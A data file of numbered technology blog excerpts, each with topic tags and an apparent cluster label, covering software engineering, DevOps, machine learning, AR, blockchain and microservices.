568,"One of the most common sources of programming error is something I call hidden requirements. These are unwritten rules that a piece of software must follow in order to function correctly, and which were only known to the original author of the code. A programmer who tries to modify the code after the original author has left may inadvertently violate those rules, creating bugs. (One can try to deduce or reverse-engineer hidden requirements by examining the code, but in practice this ranges from difficult to impossible. )Again, for the sake of brevity, Ill provide an example that is overly simplistic. Lets say that the original author has implemented a simple hash table. Now, we know that certain hash algorithms perform better when the size of the table is a prime number. So the author sets the table size to a fixed prime number, lets say 127.","['Software Engineering', 'Programming']",13
569,"That policy might look like this: This syntax might look a little strange. Ive created a policy called read in the package demo.authz. This policy is a set of statements that must all be true in order for the result to be true. So, in this case, the username on the incoming JWT token (OPA supports tokens natively!) has to be the one that received a grant where the mode array contains a ""read"" value and the resource property of the grant matches the path variable on the input to the policy query. I would then just issue a query via OPAs HTTP API for demo.authz.read, supplying the necessary input, and expect a boolean reply. I could also use rules and policy to filter the list of resources available to a given user.","['Open Policy Agent', 'Policy', 'Authorization', 'Microservices', 'Security']",15
570,"There is nothing wrong with considering a blockchain whenever you have data to store and handle. The important point to take note of is: blockchain is probably not the right tool for your problem, despite being an exciting technology. But how do you systematically think through the options and decide wither to use a blockchain or one of the many alternatives to blockchain? Several groups have come up with their take on When to use blockchain? This includes academic researchers, the Hyperledger consortium, and the National Institute of Standards and Technology (NIST) of the USA. Their answers are geared more towards a technical audience that builds software-based products rather than business developers and decision makers in management. Nonetheless, their answers can guide managers and help to facilitate communication between technical staff and management.","['Blockchain', 'Product Management', 'Business Strategy', 'Software Development']",10
571,"Unless you are building a blockchain product on purpose, there is no generic answer to this question. I strongly recommend to take all flow charts mentioned here, sit down with business people as well as engineers, possibly together with a mediator, and walk through the charts. The chart structure is generally aligned along the same set of questions: Do you need to store data? Is it you, or are there others who need to read and modify the data? Do you trust each other, or do you need to enforce honesty with a technological solution? But neither chart offers guidance to think through business-specific aspects of blockchain: Where can blockchain solve problems? Where is blockchain better than existing solutions? Going back to the example of clearing houses: Are the laws enabling clearing houses just the best bad solution we could think of so far? Is it better to replace clearing houses with a trust-less, decentralized blockchain-based solution? The answer will depend on the willingness of the industry to embrace and use new solutions as well as the regulatory support or pressures for an alternative solution.","['Blockchain', 'Product Management', 'Business Strategy', 'Software Development']",10
572,"However, probing and contemplating with some effort, one can come up with so many wonderful ML questions, which, when answered and analyzed, can reveal deeper aspects beautifully. Basically, these questions may help us to get our head out of this pile shown above. We just do not want to stir a data set all day long, we want to dive deep into the properties, quirks, and intricacies of machine learning techniques and embrace them After all, there are plenty of article on the internet about standard interview questions for machine learning. Can we do little different and interesting? I built a linear regression model showing 95% confidence interval. Does it mean that there is a 95% chance that my model coefficients are the true estimate of the function I am trying to approximate? (Hint: It actually means 95% of the time)What is a similarity between Hadoop file system and k-nearest neighbor algorithm? (Hint: lazy)Which structure is more powerful in terms of expressiveness (i.e. it can represent a given Boolean function, accurately)a single-layer perceptron or a 2-layer decision tree? (Hint: XOR)And, which one is more powerfula 2 layer decision tree or a 2-layer neural network without any activation function? )Can a neural network be used as a tool for dimensionality reduction?","['Machine Learning', 'Data Science', 'Statistics', 'Artificial Intelligence', 'Deep Learning']",5
573,"Everybody maligns and belittles the intercept term in a linear regression model. Tell me one of its utilities. (Hint: noise/garbage collector)LASSO regularization reduces coefficients to exact zero. Ridge regression reduces them to very small but non-zero value. Can you explain the difference intuitively from the plots of two simple function|x| and x? (Hint: Those sharp corners in the |x| plot)Lets say that you dont know anything about the distribution from which a data set (continuous valued numbers) came and you are forbidden to assume that it is Normal Gaussian. Show by simplest possible arguments that no matter what the true distribution is, you can guarantee that ~89% of the data will lie within +/- 3 standard deviations away from the mean (Hint: Markovs Ph.","['Machine Learning', 'Data Science', 'Statistics', 'Artificial Intelligence', 'Deep Learning']",14
574,"D. adviser)Majority of machine learning algorithms involve some kind of matrix manipulation like multiplication or inversion. Give a simple mathematical argument why a mini-batch version of such ML algorithm might be computationally more efficient than a training with full data set. (Hint: Time complexity of matrix multiplication)Dont you think that a time series is a really simple linear regression problem with only one response variable and a single predictortime? Whats the problem with a linear regression fit (not necessarily with a single linear term but even with polynomial degree terms) approach in case of a time series data? (Hint: Past is an indicator of future)Show by simple mathematical argument that finding the optimal decision trees for a classification problem among all the possible tree structures, can be an exponentially hard problem. (Hint: How many trees are there in the jungle anyway? )Both decision trees and deep neural networks are non-linear classifier i.e. they separates the space by complicated decision boundary. Why, then, it is so much easier for us to intuitively follow a decision tree model vs. a deep neural network? Back-propagation is the workhorse of deep learning. Name a few possible alternative techniques to train a neural network without using back-propagation. (Hint: Random search)Lets say you have two problemsa linear regression and a logistic regression (classification). Which one of them is more likely to be benefited from a newly discovered super-fast large matrix multiplication algorithm? (Hint: Which one is more likely to use a matrix manipulation? )What is the impact of correlation among predictors on principal component analysis? You are asked to build a classification model about meteorites impact with Earth (important project for human civilization). After preliminary analysis, you get 99% accuracy. What can you do about it? (Hint: Rare event)Is it possible capture the correlation between continuous and categorical variable? If you are working with gene expression data, there are often millions of predictor variables and only hundreds of sample. Give simple mathematical argument why ordinary-least-square is not a good choice for such situation if you to build a regression model. (Hint: Some matrix algebra)Explain why k-fold cross-validation does not work well with time-series model. What can you do about it? (Hint: Immediate past is a close indicator of future)Simple random sampling of training data set into training and validation set works well for the regression problem. But what can go wrong with this approach for a classification problem? What can be done about it? (Hint: Are all classes prevalent to the same degree? )Which is more important to you model accuracy, or model performance? If you could take advantage of multiple CPU cores, would you prefer a boosted-tree algorithm over a random forest? (Hint: if you have 10 hands to do a task, you take advantage of it)Imagine your data set is known to be linearly separable and you have to guarantee the convergence and maximum number of iterations/steps of your algorithm (due to computational resource reason). Would you choose gradient descent in this case? (Hint: Which simple algorithm provides guarantee of finding solution? )Lets say you have a extremely small memory/storage. What kind of algorithm would you preferlogistic regression or k-nearest neighbor? (Hint: Space complexity)To build a machine learning model initially you had 100 data points and 5 features. To reduce bias, you doubled the features to include 5 more variables and collected 100 more data points. Explain if this is a right approach? (Hint: There is a curse on machine learning. )If you have any other fun ML question or ideas to share, please contact the author here. Good questions are hard to generate and they give rise to curiosity and force one to think deeply. By asking funny and interesting question, you make the learning experience enjoyable and enriching at the same time. Hope you enjoyed this attempt of doing that.","['Machine Learning', 'Data Science', 'Statistics', 'Artificial Intelligence', 'Deep Learning']",5
575,"The newest in tech buzzwords: Serverless! Soon to be victim of terminology inappropriately used by every corporate strategist across Americacue blockchain similarities! But theres really no denying the merits of serverless. I think its beyond a doubt the future of computing. Whether serverless is coming from centralized AWS, or hopefully on Ethereum (once we get scaling) or tangential projects like Golem, microservices that can be charged per iteration are here to stay. Currently, AWS rules this space with Lambda and its sidecar offerings (see: __url__ serverless.","['AWS', 'Lambda', 'Web Scraping', 'Python', 'Serverless']",10
576,"Another reason that Lambda is toughthe documentation is tricky. There are so many tutorials/documents that Amazon gives for thisbut all of them get pretty technical, pretty quickly. Take a look here: __url__ simple.","['AWS', 'Lambda', 'Web Scraping', 'Python', 'Serverless']",15
577,"So lets take a look at the storage aspect that I used. Using the boto3 library from Amazon, you can use your access key to place files into a provided bucket. Note: to do this, youll need AWS credentials configured. Get the data using the scrape function, add the date to the file name since this will run everyday and I need to identify the file, and put it in S3 using boto: Seems like it should work fine right?","['AWS', 'Lambda', 'Web Scraping', 'Python', 'Serverless']",7
578,"So remember to engineer for mild success. Design a system that is easy to maintain and solves the problems you need to solve today. Generalize when it becomes a net saving (even though it will be incrementally more expensive). And remember, you always pay a price for tech debt. Like with debt in the real economy, the question is only whether or not the overall growth reduces the relative cost of the payment.",['Software Development'],12
579,"Flutters UI widgets are a facsimile of the native widgets. As such they dont always feel quite right. Also, Flutter will be in a constant state of catch-up as it has to react to innovations and improvements to i OS and Android. For example, Flutter doesnt (yet) give you access to ARKit/i OS or ARCore/Android. * When substituting the name of other tools with Flutter, the statements made by other cross platform tools seem to hold pretty well. [Flutter] React Native lets you build mobile apps using only [Dart] Java Script.letting you compose a rich mobile UI from declarative components.","['Mobile App Development', 'Story', 'Flutter', 'iOS', 'Android']",19
580,"Then once youre done, youve gotta choose a project idea and use the learnings from the tutorials and implement your own project. Here are Graph QL related projects you can reference while building yours: Fan Boost Sick Fits (You can take Wes paid course if you like)Naperg For ideas Id suggested doing an extension of something youre really interested in. For example, I like Star Wars so I would make a Galactic Map App that helps the Death Star navigate through Hyperspace or a weapons registry for Stormtroopers. But here and here are regular ideas if you need, remember keep it light and simple! There is a chance you might not use Prisma for a production app, which is fine. As Prisma is just an ORM, all the other Graph QL principles will still be applicable when using other libraries. Your recreation of those tutorials is just a quick throwaway to get to grips with Graph QL.","['GraphQL', 'JavaScript', 'Nodejs', 'Front End Development', 'Software Development']",6
581,"For this project, our brief was to capture the clients conference theme: the future of communication. To bring this to life, we wanted to create a shared AR experience that could be a little taste of what a mixed reality future would look like. We also wanted to have a bit of fun. Imagine if we could hang emojis on every street corner, or start message threads hanging in our favourite cafes? We only had a month to pull it off, but its a space weve been working pretty hard in lately, so we figuredwhy not? Wed just come off the back of creating our digital twin application, which uses image targets to align building information to a structures interior. Prior to that, wed created share VOX, a shared AR art tool, demoed at Google IO. Wed also been experimenting with Poly integration, uploading and downloading Poly models directly to our apps. We do all our work in Unity, as it allows for cross-platform support and integrates with most XR packages nicely. We decided to combine a few elements from each, to create a simple stack for shared AR communication.","['Virtual Reality', 'Augmented Reality', 'Firebase', 'Spatial Computing', 'UX Design']",6
582,"One thing we learned from our share VOX sprint was that the better an app feels to use, the more comfortable people are experimenting. This is especially true in spatial applications, where we have to translate interaction expectations into a whole new medium. We started with object manipulation widgets, little tools on the selected emoji that let you drag, scale or rotate. This was based on Unitys transform system. But watching people use their phones we realised that everyone expected that you could drag and pinch to move around. A trick we learned from Owlchemy is to watch what people try and do, and then make the app do that.","['Virtual Reality', 'Augmented Reality', 'Firebase', 'Spatial Computing', 'UX Design']",6
583,"Line it up to make it real For share VOX we used ARCores Cloud Anchors, which make a scan of the space that other phones can use as an anchor. They are an amazing tool for shared AR, but can be a bit unreliable, especially when users arent familiar with scanning. So for this, we used ARKits local anchorthis is the i OS version that maps the space locally. Our neat little trick was to use an image target to trigger and align the experience. This meant that everyone saw the same objects in the same space without the complexity of cloud anchors. Yuri Noval Harari talks about the idea of intersubjective reality, where shared ideas become real. When you share a digital object, it becomes something people see as a very real thing.","['Virtual Reality', 'Augmented Reality', 'Firebase', 'Spatial Computing', 'UX Design']",6
584,"In spitballing the idea we realised wed essentially promised a ten-player game by the end of the month. To achieve this without creating the next Fortnight, we used Firebase. Its a live database that lets you write and read to it in real time. It also broadcasts the changes you make as events that you can subscribe to. We passed update and position changes to the database, which broadcasted them to other apps. We had to solve lots of time travel paradoxes because it was asynchronous. What if one device passes a change to a system, but another device passes a contradictory change before it gets uploaded?","['Virtual Reality', 'Augmented Reality', 'Firebase', 'Spatial Computing', 'UX Design']",6
585,"We only really got to properly test multiplayer a few days before the deadline. Wed hired 10 i Pad pros to ensure a good experience but this limited our ability to test during development. Wed also had to spend a lot of time getting the final decal completed (its gotta look good and act as a good marker). With all the pieces in play, we found hundreds of megabytes were getting uploaded in a session. To add to this, everything was going crazy when we were using the image target. This was because our alignment system was moving everything at once, so every device was broadcasting and receiving every objects position every frame. This was a few days before the conference and we had to face the fact that objects were disappearing, vibrating and not behaving themselves. Thankfully our tech lead and time lord created a system that handled this logic. We created local systems that would reconcile multiple timelines, so when an emoji moved, it stayed there.","['Virtual Reality', 'Augmented Reality', 'Firebase', 'Spatial Computing', 'UX Design']",6
586,"We loved this style, but in the end decided to use a more neutral palette, so the messages were recognisable and easy to parse. We didnt want the brand to get in the way of the experience. Thankfully weve been experimenting with separating our display and data management layer, so we just had to feed our UI system different styled UI components, and the adaptive display took care of the rest. To make the messages scale we had to account for world space size and offset the canvas appropriately to get those messages scrolling and bouncing. But if we cant obsess over tiny UI details as the timeline looms, whats the point? The client is one of the main providers of SMS infrastructure to businesses, and we wanted to experiment with their API. With a few lines of javascript, any system can send SMS, with metadata, and all kinds of other bells and whistles. We experimented with having a user notified when someone replied, bringing them back to the AR chat room. We then extended this by making it possible for a user to reply via SMS and have it update in the AR Chat room. Aside from it being cool seeing an SMS pop up as an AR bubble, were always looking for ways to leverage established infrastructure. We know how to bring AR to life in peoples phones, and with SMS we can bridge the gap to users that dont have the app.","['Virtual Reality', 'Augmented Reality', 'Firebase', 'Spatial Computing', 'UX Design']",6
587,"The availability of these signals (and supporting tools) will change the way we think about software management. By default, development and operations will increasingly be ongoing learning organizations that continuously observe, orient, decide, and act on context provided by hundreds, if not thousands, of relevant signals. It would be if it was just humans doing the OODA actions. But events are going to allow a new generation of systems entrepreneurs to build solutions that are complex systems aware, intelligent, and simplify the practice immensely. Again, refer to the Five Facets of Flow post for more of my thoughts here. (Realtime, by the way, is one of the reasons why queues may not always be required in a Flow architectureif latency is of the utmost importance, you may use a different mechanism to deliver events, including direct calls to APIs elsewhere. There are people much smarter than me writing about this topic, however. )Understanding these elements of change now allows me to to directly address the value that events at scale will provide the technology community.","['Technology', 'Flow', 'Flow Architectures', 'Cloud Computing', 'Software Development']",1
588,Fast-forward about two more weeks and Im trying to do some of my interview take-home questions in Elixir in an attempt to force myself to learn it. It was like falling in love all over again. There was just one tiny hiccup: I accepted a job at Chime where the back end is all Ruby on Rails.,"['Elixir', 'Software Development', 'Software Engineering', 'Learning To Code']",2
589,"I wrote up a quick one-page document to lay out the goals and budget requirements to set up a one-day off-site Elixir focused hackathon. I noted that the off-site part, while not necessary, was high priority for me. Pulling engineers out of the day-to-day would allow for a more focused space for learning and building. I can also now admit that getting the CTO to OK some budget for a breather room was also a bit of a litmus test on how seriously we were considering Elixir. I made sure to find a range of options for the breather to fit different budgets. If you will have more than 6 people, I would definitely suggest finding a space that has at least two physical rooms so that groups can collaborate without interfering with each other.","['Elixir', 'Software Development', 'Software Engineering', 'Learning To Code']",6
590,"Realtime applications make a lot (up to tens per second) of data transfers per unit of time. tells us that the overhead of HTTPS is untenable for such an application. Websockets are permanent connections that open a TCP socket, which is an OSI intermediate layer (four) mechanism for reliably sending and receiving data remotely. A TCP socket is a low level mechanism because it allows for separate send/receive operations, and the data sent via a message must be manually coupled with the data received via another message. This means that sending a message is a fire-and-forget operation, and we must build our own protocol (read: sending numeric identifiers) to associate the request for data to the response from the server. This is complex and tedious, but allows for a much lighter overhead, given reuse of the underlying connection and a minimalist protocol which only re-sends lost messages, but does nothing else.","['Csharp', 'Sockets', 'Performance', 'Networking', 'Typescript']",11
591,"Pantheon unfortunately does not allow you to bring your own certificate. This resulted in an added layer of complexity for us as we then needed to decide whether to use the standard Lets Encrypt certificates available in Pantheon or to retain our EV cert. In the end we chose the latter, accomplishing this by placing Fastly in front of Pantheon. This benefitted us in two ways, since we also wanted to do better path-based routing and Fastly allows for that. Think /interactive/ serving from an Amazon EC2 instance for example. Note that we migrated to Fastly after migrating to Pantheon to reduce complexity, so we did rely on the Lets Encrypt certificates for about a week.","['Web Development', 'Drupal', 'Hosting', 'Rackspace', 'Migration']",11
592,"If anything caused us major grief it was encrypted fields. Previously we had our key stored on the same server just above the web root so it was safe. Pantheon only allows for key storage services, and they recommend Lockr.io. We were glad to go with a vendor they recommended but disappointed that their migration team didnt know how to implement it. Even more disappointing was that we didnt find that out until the night of the migration. Several hours in and still getting permission errors, the migration team hopped off to go to bed, and we were all frustrated. The key here that we didnt understand was how Lockr handled keys in dev vs production. I will do a shorter post on this at another time.","['Web Development', 'Drupal', 'Hosting', 'Rackspace', 'Migration']",10
593,"The schedule that worked best for us was to take a solid 24 hours for the migration. This resulted in 0 down time, simply a content freeze, which we were thrilled about. A rough schedule looks like the following:1 Week Out: Send email to all authors alerting them of upcoming content freeze. Send email to all involved in project with a timeline for migration.5 Days Out: Change your TTL on DNS entries for A records and CNAMEs to 60 or 120. This will enable the cutover to happen quicker and enable easier rollback.3 Days Out: In Pantheon, provision your HTTPS certificates. This is key to 0 down time. Dont wait till the day of to provision these.","['Web Development', 'Drupal', 'Hosting', 'Rackspace', 'Migration']",11
594,"That said, there were some factors I was less than enthusiastic about. As much as I love the Pantheon interface, the permissioning is not quite where it needs to be. It would be nice to have a more granular set of permissions where we can decide which environment each user has access, create SFTP only users, etc. Additionally, I constantly clear the cache accidentally because the button looks like a menu. Personal problem, I know, but I cant be the only one. Finally, we had been hoping for some real performance boosts, but we really only saw mild gains using the Pantheon Global CDN. We hope that over time these gains improve, especially on our well-travelled pages, but ultimately we are not sophisticated enough to know that at this point.","['Web Development', 'Drupal', 'Hosting', 'Rackspace', 'Migration']",10
595,"In 2015, I started experimenting with Kubernetes and I loved it! But there were many aspects of it that I didnt like (and I still do not):context: IMHO, one of the most difficult concepts of Kubernetes to grasp, and one of the most dangerous. Context are a client concept, they are difficult to understand, inconsistently named, and introduce ambiguity when running kubectl commands. I hate (kubectl) contexts!verbose, nested (yaml!) configuration: Took me some time to understand the meaning of each layer of yaml configuration in a manifest. Why did I have to repeat labels in 2-3 different places to make it work?imperative/declarative mess: Kubernetes novice users are encouraged to learn about it by using imperative commands, when everybody knows thats not what grown-ups really use! I believe this confuses the person that needs to translate a trial of Kubernetes into a proper deployment strategy to help their business. Spoiler: there is no official definition of proper strategyrun-time configuration: I also agree with Jesse Suen when they warn against passing configuration options to the command line of helm (or kubectl or anything). Passing parameters makes it difficult to ensure the same command will be run twice the same way.application configuration: Well done, you have learnt to manage your Kubernetes yaml manifests. But lets remember that a pod/deployment is just a mere vessel. You havent actual managed the configuration of the application on top of it.developers just wanna have fun: the workflow for a developer interacting with Kubernetes is still broken/undefined. Kubernetes fans still try to convince developers to develop against kubernetes, but are we not just pushing it on them? Listen to Kelsey Hightower!operators: I have mixed feelings about them, but lets not fight this battle today! :) Lets just say that I think they are often abused.idempotency: Or rather, lack of. Some combined use of the above points encourage workflows that lack idempotency, which is a pity in the case of Kubernetes! While trying to address some of the above problems, I hacked together a tiny templating system that was making use of j2cli and a couple of bash wrapper scripts to manage kubernetes configurations.","['Kubernetes', 'Kapitan', 'Helm', 'DevOps']",10
596,"Configure your kubernetes setup: compiled/target_A/setup/setup.sh Apply your changes by running: compiled/target_A/setup/apply.shidempotent: Kapitan encourages you to make changes to the templates and the inventory to refactor your code. Compiled manifests/code will not change if you did not mean them to, meaning you get reassurance that your refactoring is correct and low risk.cause&effect: We encourage a workflow where both inventory/template changes and compiled files are in the same merge request. This allows the reviewer to assess both the intended change and the actual effect it cause. This is very helpful to understand if a change to a template will affect one, two or many targets!last mile: Kapitan does not speak Kubernetes: all it does is to create files. kubectl will be in charge to actually deploy the change. All we do is to wrap around commands to execute them in a consistent way Lets be clear: you probably dont need Kapitan (yet)! Depending on what you are trying to do, and how complex is your setup, you might be doing just fine.","['Kubernetes', 'Kapitan', 'Helm', 'DevOps']",18
597,All writes are validated via an extensible state machine. Every entity MUST define a base set of states which can be extended but never reduced. This also defines the set of actions supported on the entity. Trip service defines CREATED->STARTEDCOMPLETED as the core set of transitions that must happen in that order. Myntra trips team might want to define an extra state to make this: CREATEDPENDING-STARTSTARTEDCOMPLETED. Both of these will be configured and invoked while trip updates are happening for Myntra and Store trips respectively.,"['Microservices', 'Platform Thinking', 'Platform Architecture', 'Software Engineering', 'Software Architecture']",15
598,"Finally, location is a powerful notification mechanism. Consider this interesting stat: research has shown that humans are such creatures of habit that we only visit an average of 25 places with any regularity. As you play Pokemon Go, you begin to associate landmarks in the real world with landmarks in the game since they are one and the same. And since you are passing through the same 25 places throughout your normal day, those regular visits become subtle but constant reminders of Pokemon Go. Other games depend on artificial notifications to draw you back into their digital universe. Pokemon Go on the other hand can use landmarks in your daily, real world routine to draw you back into their digital world universe because of their use of location.","['Pokemon', 'Pok\\xc3\\xa9mon Go', 'Location Based Services', 'Mobile Games', 'Nintendo']",17
599,"As the battle rages on, I have to admit that I am someone who has spoofed at one point. [If youre curious how, Ive included what I did at the end of this post.] At first, it was wildly entertaining. I checked off my Pokemon Go bucket list and virtually visited popular destinations from the Taj Mahal to the Imperial Palace in Tokyo to the Sydney Opera House. I caught rare Pokemon missing from my collection. I played when and wherever I wanted. And thats when it all stopped being entertaining.","['Pokemon', 'Pok\\xc3\\xa9mon Go', 'Location Based Services', 'Mobile Games', 'Nintendo']",17
600,"There are 809 total Pokemon characters in existence today, with approximately 493 available in Pokemon Go. So by one measure, the app still has 40% of its lifecycle remaining. But the Pokemon Company and Niantic recently announced a new Pokemon in the gamethe first time theyve ever created a new character for Pokemon Go first. Not only is the Pokemon Go universe not finite, it is easily expandable with no new game design needed. Niantic doesnt have the same pressure as other games of constantly releasing new levels and new playing modes to keep players engaged. As a collectible, Niantic simply needs to do one thingnever run out of things to collect.","['Pokemon', 'Pok\\xc3\\xa9mon Go', 'Location Based Services', 'Mobile Games', 'Nintendo']",17
601,"Spend time solving user problems, not technology problems. We wanted to avoid spending countless hours discussing what technology to use or building our own technology. We used AWS Lambda so we didnt have to think about servers and scaling. We used Create React App so we didnt have to worry about build configuration for our front end app. We made early tech decisions and stuck to them.","['Continuous Integration', 'Agile', 'Software Development', 'DevOps', 'Continuous Delivery']",10
602,"When deploying code changes automatically, it is critical to understand the impacts the changes will have and to stop deployments that introduce bugs or regressions. This means we needed to write tests that confirm the code is functioning as expected. Whenever we integrate new code to a release branch, the CI tool automatically runs our test suite. Any failures in the test suite will cancel the deployment process. Developers would also run this test suite locally to confirm everything worked before pushing changes. Automated testing is also much quicker, less cumbersome and less prone to human error than manual testing. Delivering at speed doesnt work if all new code needs to be manually tested by a human for an hour. As a team we agreed that we would write tests for all the code we wrote. For cases where it wasnt practical to write tests, we would need to give a reason. Any time we fixed a bug, we would also write a test that covered the bug. We made sure to that we had tests for common user interactions and journeys(integration tests), as well as tests for the individual functions that made up our applications(unit tests).","['Continuous Integration', 'Agile', 'Software Development', 'DevOps', 'Continuous Delivery']",13
603,"Updating our codebase in small increments increased the rate we delivered improvements to our users. Small updates are easier to integrate into the codebase. Our code review process became more rigorous because it was easier and quicker for developers to review small pull requests. It is much easier to identify issues and impacts of new code because the surface area of the code was so small. One technique we found useful was moving the design quality assurance(QA) audit process to the pull request level. This made the QA process more focused and quicker as opposed to when it carried out every few days on a large set of multiple changes. As a team we made an agreement that we would keep PRs small. We also agreed that we would review PRs within half a day. If we werent able to review within that time frame, we needed to let the author know.","['Continuous Integration', 'Agile', 'Software Development', 'DevOps', 'Continuous Delivery']",1
604,"Functions are the building blocks of our applications. These functions should be small, decoupled and have a single purpose. This makes it easier for developers to follow and understand the logic of the application. Its easier to repurpose existing functions to reduce the amount of code written. Changing functions is much safer because the surface area of function is so small and the effects of the change are easier to understand. As a team we would carefully review each others pull requests and give feedback to help each other write the best code we could.","['Continuous Integration', 'Agile', 'Software Development', 'DevOps', 'Continuous Delivery']",9
605,"There are two primary users of the code we write: computers who run the code and humans who read and change the code. Most developers are pretty good at writing code for computers. If your code runs or complies without bugsit means you did a good job writing code for the computer. Some developers forget about writing code for humans. If code is hard to understand it will take longer for developers to understand and update the code. We focused on making it clear the purpose, outputs and inputs of each function.","['Continuous Integration', 'Agile', 'Software Development', 'DevOps', 'Continuous Delivery']",9
606,"Whenever we change code we need to be sure our changes have not regressed the previous functionality of the code. This is one of the great benefits of having tests. It adds a level of safety to making code changes. We made our lives easier by writing code in a way that made it simple to write tests for. A technique for writing code that is easy to test, is to use pure functions.","['Continuous Integration', 'Agile', 'Software Development', 'DevOps', 'Continuous Delivery']",13
607,"This is heavily influenced by my personal taste and career situation. Please share your thoughts about other episodes that caught your attention this year. The elusive formula for great hiring with Aneel Bhusri (Masters of scale)Workday co-founder and CEO Aneel Bhusri knows: Your first hires equal cultural co founders. And its worth your time to get every one right. Aneel personally interviewed his first 500 employees at Workday. Today, with 8000+ employees and $2b in annual revenue, Workday is consistently rated one of the best places to work.9. The state of API design with Mike Mason and Zhamak Dehghani (Thoughtworks podcast)RESTful APIs quickly established themselves as useful architectural style for replatforming legacy systems with web-based ones. But increasingly, developers are running into the boundaries of deploying REST and API purityconfronting real world issues such as the rapid evolution of APIs for frontend layers where connectivity is patchy and where APIs should meet the changing visual representation and behavior of the frontend, where we increasingly see the adoption of alternatives such as Graph QL.","['Software Engineering', 'Software Architecture', 'Kubernetes', 'Data Science']",2
608,"Martin Woodward has been at Microsoft for 13 years and he joins the show to talk about how software delivery within the company has evolved.7. Tools for Data Science with Jeroen Janssens (Software Engineering Radio)This episode further considers what skills people need to be great data scientists; skills that are related but not always equal to the skills that programming and software engineering require. Also explores options that differ from programming, such as Jupyter Notebooks and analyzing data at the command line.6. Enterprise Smart Contracts with Marley Gray (Software Engineering Daily)Smart contracts allow for programmatic execution of contractual agreements. Code is law, and there is less ambiguity. The most widely used smart contract platform is the Ethereum blockchain, but several large enterprises are creating their own smart contracts. Should all smart contracts be decentralized, or do enterprise consortium blockchains make sense? In this episode, Marley Gray from Microsoft joins the show to discuss enterprise smart contracts, why you would want to use them and how they can be architected. Marley has worked on banking and financial technology for over a decade, and makes some strong arguments for why banks will adopt smart contracts, and the timeline for how that might take place.5. Load Balancing and HAProxy with Daniel Corbett (Software Engineering Radio)Daniel Corbett of HAProxy discusses how load balancers such as HAProxy are used to improve application scalability, reliability, and security. Host Jeremy Jung spoke with Corbett to explain the concept of load and how a load balancer can distribute it across application servers; the open systems interconnection (OSI) model and how it relates to load balancers; how HAProxy compares to other solutions and some of its defining features. Finally, they reflect on how the role of load balancers has changed in the modern landscape of microservices and container orchestration.4. Migrating from VMs to Kubernetes with Nicole Hubbard (Software Engineering Radio)Word Press Engine migrated their infrastructure from VMs to containers. The work involved planning and executing a migration of about 60,000 customers. Other topics discussed were cost benefits and scaling an infrastructure.3. Site Reliability Management with Mike Hiraga (Software Engineering Daily)Site reliability engineering (or SRE) is a newer point along the evolutionary timeline of operations. Web applications can be unstable sometimes, and SRE is focused on making a site work more reliably. This is especially important for a company that makes business applications which other companies rely on. Mike Hiraga is the head of site reliability engineering at Atlassian. It makes several products that many businesses rely onsuch as JIRA, Confluence, Hip Chat, and Bitbucket.2. Fission: Serverless on Kubernetes with Soam Vasani (Software Engineering Daily)Fission is an open source framework for serverless functions built on Kubernetes. It allows developers to deploy functions-as-a-service without being locked in to any specific cloud provider. Soam Vasani is the creator of Fission and an engineer at Platform9.","['Software Engineering', 'Software Architecture', 'Kubernetes', 'Data Science']",5
609,"We dont want to paint only a positive picture with no areas for improvement. For example, test automation requires extensive investment and preparation to embark on. While manual QA engineers only need documentation on hand to start working, its not that simple with automated tests. First, we should define clearly what app functionality will be covered by the tests, ideally with a prototype on hand. Then, we should choose a preferred tool and develop a testing framework to start working, lastly, its important to constantly keep an eye on the scripts so that they stay up-to-date as the product functionality changes and gets updated. As you see, its a pretty laborious process.","['Software Development', 'Qa Automation', 'Mobile App Development', 'Automated Testing', 'Sdlc']",13
610,A quick disclaimer is in order. The first is that the approach Ill share in this post may not be a good fit for your projects. The approach Ill share here has been proven at Flywheel Sports and a host of other companies. I wrote an earlier post detailing why we built Hydra and the role it played in the building of our nation-wide live video streaming service.,"['Microservices', 'Hydra', 'Redis', 'Nodejs']",6
611,Microservice presence can be managed using keys which auto-expire. Updating the key is done automatically by Hydra on behalf of the host service. Meaning its not something the developer does. Failure to update the key within 3 seconds results in the service being perceived as unavailable. That probably means the service isnt healthy.,"['Microservices', 'Hydra', 'Redis', 'Nodejs']",11
612,"In this next example on the left, queuing a message is as simple as creating a UMF message and calling queue Message to send it. The code on the lower right shows the image processing service dequeuing a message by calling get Queued Message and later calling mark Queue Message once its processed the message. So to recap, sometimes, it isnt feasible to expect an immediate response. In those cases, we just need to queue work for later processing. The Redis List data structure can be used as a message queue. Commands like lpush and rpoplpush with atomic operations make this feasible. Here again, we saw how easy basic queuing can be using higher-level abstractions.","['Microservices', 'Hydra', 'Redis', 'Nodejs']",3
613,"Distributed logging is another vital feature of any microservice architecture. However, if you know Redis you might be appalled at the thought of using it as a distributed logger. And youd probably be rightfully concerned. However, you could use it as a flight recorder. Where you only store the most serious errors and you limit the number of entries using lpush and ltrim. Then at least you would have a quick way of checking what might have gone wrong with your microservice.","['Microservices', 'Hydra', 'Redis', 'Nodejs']",11
614,"Managing the configuration files for distributed microservices can be challenging. However, you can even use Redis to store configuration files for your services. We did this and it seemed like a good idea at the time. However, were starting to move away from it. As the core disadvantage is that storing configs in Redis makes Redis stateful and thats less than ideal. But this is possible, so Id like to share this with you.","['Microservices', 'Hydra', 'Redis', 'Nodejs']",11
615,"Login to the halyard container to test the connection to your Kubernetes cluster: Optionally, if you want command completion run the following inside the halyard container: In Spinnaker terms, to deploy applications we use integrations to specific cloud platforms. We have to configure Halyard and set the cloud provider to Kubernetes v2 (manifest based) since we want to deploy Spinnaker onto a Kubernetes cluster: Next we create an account. In Spinnaker, an account is a named credential Spinnaker uses to authenticate against an integration provider Kubernetes in our case: Make sure to replace <my_account> with an account name of your choice. Save the account name in an environment variable $ACCOUNT. Next, we need to enable Halyard to use artifacts: Halyard supports multiple types of Spinnaker deployments. Lets tell Halyard that we need a distributed deployment of Spinnaker: Spinnaker needs a persistent store to save the continuous delivery pipelines and other configurations. Halyard lets you choose from multiple storage providers. For the purposes of this article, we will use Minio.","['Kubernetes', 'K8s', 'Spinnaker', 'Continuous Delivery', 'Docker']",7
